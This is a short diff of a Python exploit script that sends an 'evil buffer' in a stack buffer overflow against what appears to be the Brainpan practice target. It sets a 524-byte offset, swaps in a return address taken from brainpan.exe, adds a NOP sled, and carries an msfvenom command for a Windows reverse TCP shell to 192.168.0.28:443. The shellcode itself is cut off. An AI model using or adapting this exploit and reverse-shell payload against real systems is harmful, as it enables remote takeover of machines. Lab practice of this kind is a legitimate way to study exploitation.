@@ -4,8 +4,7 @@ try:
     print "\nSending evil buffer..."
     # Per msf-pattern_offset, exact match at 524 bytes 
     filler = "\x41" * 524
-    #eip = "\x42" * 4
-    eip = "\x43\xd7\xec\x75"
+    eip = "\xf3\x12\x17\x31"    # from brainpan.exe
     nops = "\x90" * 8
     #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.28 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00"
     shell = (
